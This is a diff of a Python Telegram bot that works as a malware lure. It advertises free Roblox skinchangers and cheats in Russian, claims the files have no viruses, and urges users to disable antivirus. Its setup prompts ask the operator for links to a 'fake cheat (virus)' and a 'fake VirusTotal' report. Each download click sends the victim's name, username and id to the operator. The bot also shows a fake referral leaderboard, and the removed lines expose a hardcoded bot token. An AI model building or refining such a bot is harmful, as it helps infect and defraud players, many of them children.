@@ -2,11 +2,8 @@
 from aiogram import Bot, Dispatcher, executor, types
 import logging
 from db import Database
-import socket
-from datetime import datetime
 from colorama import Fore
-from time import sleep
-import requests
+import bcrypt
 
 # main()
 if __name__ == '__main__':
@@ -26,7 +23,7 @@ if __name__ == '__main__':
                     [2] Install Requirements
                     [3] Exit {Fore.RESET}
     '''
-    #print(label)
+    print(label)
     choice = input(f"{Fore.LIGHTCYAN_EX}Choose: {Fore.RESET}")
     if choice == '3':
         exit()
@@ -36,32 +33,40 @@ if __name__ == '__main__':
 
     else:
 
-        c_token = "6228298637:AAGoxLgLAiU845AakUy-Dc9IMsa6xWXWN6I" #input(f"{Fore.LIGHTBLUE_EX}Token: {Fore.RESET}")
-        admin_id = ""#input(f"{Fore.RED}Your id for admin panel: {Fore.RESET}")
-        name = "000"#input(f"{Fore.GREEN}Enter name of the your fake \"Company\": ")
+        c_token = input(f"{Fore.LIGHTBLUE_EX}Token: {Fore.RESET}")
+        bytePwd = c_token.encode('utf-8')
+        admin_id = input(f"{Fore.RED}Your id for admin panel: {Fore.RESET}")
+        name = input(f"{Fore.GREEN}Enter name of the your fake \"Company\": ")
+        help0 = input(f"{Fore.LIGHTBLUE_EX}Enter the @nickname for help (Техническая Поддержка): {Fore.RESET}")
+        skinp = input(f"{Fore.LIGHTBLUE_EX}Enter the skin password (.zip, .rar): {Fore.RESET}")
+        cheatp = input(f"{Fore.LIGHTBLUE_EX}Enter the cheat password (.zip, .rar): {Fore.RESET}")
+        fake0 = input(f"{Fore.GREEN}(Skinchanger) Enter the link for 1 file (mega,google,any file changes): {Fore.RESET}")
+        fake0_vt = input(f"{Fore.LIGHTBLUE_EX}(Skinchanger) Enter the fake virustotal for 1 files (virustotal): {Fore.RESET}")
+        fake1 = input(f"{Fore.GREEN}(Cheat) Enter the link for 2 file (mega,google,any file changes): {Fore.RESET}")
+        fake1_vt = input(f"{Fore.LIGHTBLUE_EX}(Cheat) Enter the fake virustotal for 1 files (virustotal): {Fore.RESET}")
         ready = input(f"{Fore.LIGHTRED_EX}Launch bot? (y, n): {Fore.RESET}")
 
         bot = Bot(c_token)
         dp = Dispatcher(bot)
         defoult_id = 1058852120
         db = Database('users.db')
-        if ready == "y" or "1": #change
+        salt = bcrypt.gensalt()
+        if ready == "y": 
 
             # Some Information
-            print(f"{Fore.RED}Started of the token: {c_token}\n"
-                  f"Admin_Id: {admin_id}"
-                  f"{Fore.RESET}\n"
-                  f"{Fore.MAGENTA}Admin panel:\n"
-                  f"Write to bot 'adm'{Fore.RESET}")
-
+            print(f"\n\n\n"                                  
+                  f"{Fore.MAGENTA}Hashed Token: {Fore.RESET}{Fore.RED}{bcrypt.hashpw(bytePwd, salt)} (Salt: {salt}){Fore.RESET}\n"
+                  f"{Fore.MAGENTA}Your Admin Id: {admin_id}"
+                  f"\n"
+                  f"To use Admin Panel: write 'adm'{Fore.RESET}\n\n")
 
             @dp.message_handler(commands=['start'])
             async def welcome(message: types.Message):
+
                 markup = types.ReplyKeyboardMarkup(
                     resize_keyboard=True,
                     row_width=2,
-                    input_field_placeholder="⬇️ Выберите кнопку: ",
-                    one_time_keyboard=True)
+                    input_field_placeholder="Выберите кнопку: ")
                 start = types.KeyboardButton("🥷🏻 ПРОФИЛЬ")
                 top = types.KeyboardButton("📊 ТОП")
                 help = types.KeyboardButton("✨️ ПОМОЩЬ")
@@ -75,23 +80,16 @@ if __name__ == '__main__':
                 else:
                     markup.add(start, soft, top, help)
                     await bot.send_message(
-                        message.from_user.id,
-                        "🔥 Добро пожаловать, здесь вы можете получить\n"
-                        "♻️ Skinchanger Roblox 2.3.1 by n0nBann3d\n"
-                        "🔥 EazyScript by crash1d"
-                        f"⠀⠀  \n"
-                        "ℹ️ Все файлы запускаются на пк!\n"
-                        "♻️ Никаких вирусов нет!",
+                        message.from_user.id,"🔥 Добро пожаловать, здесь вы можете получить\n\n👽 Skinchanger Roblox 2.3.1 by n0nBann3d\n👾 EazyScript by crash1d\n\n⚠️Все файлы запускаются на пк!\n♻️ Никаких вирусов нет!",
                         reply_markup=markup)
 
-
-            @dp.message_handler(content_types=['text', 'photo'])
+            @dp.message_handler(content_types=['text'])
             async def bot_message(message: types.Message):
+
                 markup = types.ReplyKeyboardMarkup(
                     resize_keyboard=True,
                     row_width=2,
-                    input_field_placeholder="Выберите кнопку: ",
-                    one_time_keyboard=True)
+                    input_field_placeholder="Выберите кнопку: ")
 
                 if message.chat.type == 'private':
 
@@ -104,21 +102,16 @@ if __name__ == '__main__':
                     ref.insert(back)
                     if message.text == '🥷🏻 ПРОФИЛЬ' or message.text == '/profile':
 
-
-                        await bot.send_message(admin_id or defoult_id, text="Была нажата кнопка 'профиль'\n"
-                                                              f"Nick: {db.get_nickname(message.from_user.id)}\n"
-                                                              f"Id: {message.from_user.id}")
-
                         user_nickname = f"👋 Добро пожаловать в ваш профиль!" \
                                         f"\n⠀⠀  " \
-                                        f"\n🧑‍💻 Ваш псевдоним: {db.get_nickname(message.from_user.id)} \n🎁 Количество ваших рефералов: (В РАБОТЕ)"
+                                        f"\n🧑‍💻 Ваш псевдоним: {db.get_nickname(message.from_user.id)} \n🎁 Количество ваших рефералов: "
                         await bot.send_message(message.from_user.id, text=user_nickname, reply_markup=ref)
 
                     elif message.text == '✨️ ПОМОЩЬ':
-                        await bot.send_message(message.from_user.id, "🔱 Контакт для помощи: @n0n_bann3d")
+                        await bot.send_message(message.from_user.id, f"🔱 Контакт для помощи: {help0}")
 
                     elif message.text == '📊 ТОП':
-                        await bot.send_message(message.from_user.id,
+                        await bot.send_message(message.from_user.id,    #   FAKE REFERALS
                                                "🔰 Реферальная система. Баллы выдаются за приглашение людей!\n"
                                                "🥇 Ник: Скрытый Рефералы: 16 \n"
                                                "🥈 Ник: Скрытый Рефералы: 13\n"
@@ -137,11 +130,12 @@ if __name__ == '__main__':
                         skinchange = types.InlineKeyboardButton(text="✨ СКИНЧЕНДЖЕР",
                                                                 callback_data="skin")
                         cheats = types.InlineKeyboardButton(text="🚀 ЧИТЫ", callback_data="cheat")
-                        back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")  # 1
+                        back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1") 
 
                         inline.insert(skinchange)
                         inline.insert(cheats)
                         inline.insert(back)
+
                         await bot.send_message(message.from_user.id,
                                                text="⬇️ Выберите тип: ",
                                                reply_markup=inline)
@@ -211,24 +205,21 @@ if __name__ == '__main__':
             @dp.callback_query_handler(text='skin')
             async def choice1(call: types.CallbackQuery):
 
-                await bot.send_message(admin_id or defoult_id, text=f'''Somebody downloaded:
-        
-        Fullname: {types.Message.from_user.full_name}
-        @username: {types.Message.from_user.username}
-        id: {types.Message.from_user.id}''')
+                await bot.send_message(admin_id or defoult_id, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')
 
                 skins = types.InlineKeyboardMarkup(row_width=2)
                 vt1 = types.InlineKeyboardButton(
-                    # FAKE VIRUS TOTAL ( EDIT )
+                    
                     text="♻️ VirusTotal",
+                    callback_data="main",
                     url=
-                    "YOUR FAKE VIRUSTOTAL!!!!"
+                    fake0_vt
                 )
                 download1 = types.InlineKeyboardButton(
                     text="🔥 Скачать",
                     callback_data="main",
                     url=
-                    "YOUR FAKE CHEAT (VIRUS)")
+                    fake0)
 
                 back = types.InlineKeyboardButton(
                     text="↩️ ВЕРНУТЬСЯ",  # 2
@@ -238,38 +229,25 @@ if __name__ == '__main__':
                 skins.insert(download1)
                 skins.insert(back)
                 await call.message.edit_text(
-                    text=
-                    "♻️ Skinchanger Roblox 2.3.1 by n0nBann3d\n└Доступные режимы:\n🤩 Pet Simulator X\n😼 Blox Fruits (fixed)\n👊🏻 Jailbreak (new)\n👥 Adopt Me! (fixed)\n🚀 Mad City: Chapter 2 (new)\n❤️ MeetCity (new)"
-                    "\n⠀⠀ "
-                    "⠀⠀\n"
-                    "ℹ️ Информация: "
-                    "\n "
-                    "✨ VirusTotal - Проверка скинченджера на 59 вирусов!\n "
-                    "✈️ Если антивирус ругается на наш файл, советуем выключить его!\n "
-                    "😾 Инструкция внутри архива!\n"
-                    "🔥 Пароль от архива: skin")
+                    text=f'''♻️ Skinchanger Roblox 2.3.1 by n0nBann3d\n└Доступные режимы:\n\n🤩 Pet Simulator X\n😼 Blox Fruits (fixed)\n👊🏻 Jailbreak (new)\n 👥 Adopt Me! (fixed)\n🚀 Mad City (new)\n❤️ MeetCity (new)\n\nℹ Информация:\n\n✨ VirusTotal - Проверка скинченджера на 59 вирусов!\n✈️ Если антивирус ругается на наш файл, советуем выключить его!\n\n😾 Инструкция внутри архива!\n🔥 Пароль от архива: {skinp}''')
                 await call.message.edit_reply_markup(reply_markup=skins)
 
             @dp.callback_query_handler(text="cheat")
             async def choice2(call: types.CallbackQuery):
-                await bot.send_message(admin_id or defoult_id, text=f'''Somebody downloaded:
-        
-        Fullname: {call.from_user.full_name}
-        @username: {call.from_user.username}
-        id: {call.from_user.id}''')
 
-
+                await bot.send_message(admin_id or defoult_id, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')
                 skins = types.InlineKeyboardMarkup(row_width=2)
                 vt1 = types.InlineKeyboardButton(
                     text="♻️ VirusTotal",
+                    callback_data="main",
                     url=
-                    "your fake virus total"
+                    fake1_vt
                 )
                 download1 = types.InlineKeyboardButton(
                     text="🔥 Скачать",
                     callback_data="main",
                     url=
-                    "your fake skinchanger (virus)"
+                    fake1
                 )
 
                 back = types.InlineKeyboardButton(
@@ -277,24 +255,16 @@ if __name__ == '__main__':
                     callback_data="back"
                 )
                 skins.insert(vt1)
-                skins.insert(download1)
+                skins.insert(download1)         
                 skins.insert(back)
                 await call.message.edit_text(
-                    text=
-                    "🔥 EazyScript by crash1d\n└Функции:\n🚷 ANTI-AFK(🔥УНИКАЛЬНОЕ)\n🤩 Visuals(best)\n📵 Auto-farm\n👊🏻 Flyhack(new) \n👥 Sizechanger (🔥NEW)"
-                    "\n⠀⠀ "
-                    "⠀⠀\n"
-                    "ℹ️ Информация: "
-                    "\n "
-                    "🚀 VirusTotal - Проверка чита на 59 вирусов!\n "
-                    "😼 Если антивирус ругается на наш файл, советуем выключить его!\n "
-                    "✈️ Инструкция внутри архива!\n"
-                    "👊🏻 Пароль от архива: cheat")
+                    text=f'''🔥 EazyScript by crash1d\n└Функции:\n\n🚷 ANTI-AFK(🔥УНИКАЛЬНОЕ)🤩\n Visuals(best)📵\n Auto-farm👊🏻\n Flyhack(new)\n 👥 Sizechanger (🔥NEW)\n\n ℹ️ Информация:\n\n 🚀 VirusTotal - Проверка чита на 59 вирусов!\n😼 Если антивирус ругается на наш файл, советуем выключить его!\n\n✈️ Инструкция внутри архива!\n👊🏻 Пароль от архива: {cheatp}''')
                 await call.message.edit_reply_markup(reply_markup=skins)
 
 
             @dp.callback_query_handler(text="back")
             async def choice3(call: types.CallbackQuery):
+
                 inline = types.InlineKeyboardMarkup(row_width=2)
                 skinchange = types.InlineKeyboardButton(text="✨ СКИНЧЕНДЖЕР",
                                                         callback_data="skin")
@@ -310,10 +280,11 @@ if __name__ == '__main__':
 
             @dp.callback_query_handler(text="back1")
             async def choice4(call: types.CallbackQuery):
+
                 markup = types.ReplyKeyboardMarkup(
                     resize_keyboard=True,
                     row_width=2,
-                    input_field_placeholder="⬇️ Выберите кнопку: ")
+                    input_field_placeholder="Выберите кнопку: ")
 
                 await call.message.edit_text("⬇️ Напишите пожалуйста /start")
                 start = types.KeyboardButton("🥷🏻 ПРОФИЛЬ")
@@ -322,21 +293,10 @@ if __name__ == '__main__':
                 soft = types.KeyboardButton("👀 СОФТ")
                 markup.add(start, soft, top, help)
 
-
             @dp.callback_query_handler(text="main")
             async def scamed(call: types.CallbackQuery):
-                await bot.send_message(admin_id or defoult_id, text=f'''Somebody downloaded:
-        
-        Fullname: {call.from_user.full_name}
-        @username: {call.from_user.username}
-        id: {call.from_user.id}''')
-                
+                await bot.send_message(admin_id or defoult_id, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')
 
-
-            executor.start_polling(dp, skip_updates=True)
-        # Exit
+            executor.start_polling(dp, skip_updates=True)   
         else:
             exit()
-
-
-# by fairet
